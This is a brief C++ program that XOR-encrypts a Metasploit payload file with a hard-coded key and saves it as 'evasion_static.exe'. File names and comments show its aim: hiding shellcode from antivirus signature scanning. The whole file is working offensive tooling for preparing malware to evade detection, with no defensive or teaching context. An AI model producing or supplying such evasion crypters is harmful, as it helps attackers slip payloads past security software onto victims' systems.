#include <iostream>
#include <fstream>
#include <vector>

// XOR encryption function
void xorEncrypt(std::vector<unsigned char>& data, const std::vector<unsigned char>& key) {
    size_t keyLength = key.size();
    for (size_t i = 0; i < data.size(); ++i) {
        data[i] ^= key[i % keyLength];
    }
}

int main() {
    std::string inputFilePath = "metasploit.exe";  // Path to your shellcode
    std::string outputFilePath = "evasion_static.exe"; // Path to save the encrypted shellcode

    // Encryption key
    const std::vector<unsigned char> key = { 'e', 'v', 'a', 's', 'i', 'o', 'n', 's', 'K', 'e', 'y', '*', '*', '*' };

    // Read the shellcode from file
    std::ifstream inputFile(inputFilePath, std::ios::binary | std::ios::ate);
    if (!inputFile.is_open()) {
        std::cerr << "Failed to open input file.\n";
        return 1;
    }

    std::streamsize size = inputFile.tellg();
    inputFile.seekg(0, std::ios::beg);

    std::vector<unsigned char> buffer(size);
    if (!inputFile.read(reinterpret_cast<char*>(buffer.data()), size)) {
        std::cerr << "Failed to read input file.\n";
        return 1;
    }
    inputFile.close();

    // Encrypt the shellcode
    xorEncrypt(buffer, key);

    // Write the encrypted shellcode to file
    std::ofstream outputFile(outputFilePath, std::ios::binary);
    if (!outputFile.is_open()) {
        std::cerr << "Failed to open output file.\n";
        return 1;
    }

    outputFile.write(reinterpret_cast<const char*>(buffer.data()), buffer.size());
    outputFile.close();

    std::cout << "Encryption complete. Encrypted shellcode saved to " << outputFilePath << ".\n";

    return 0;
}
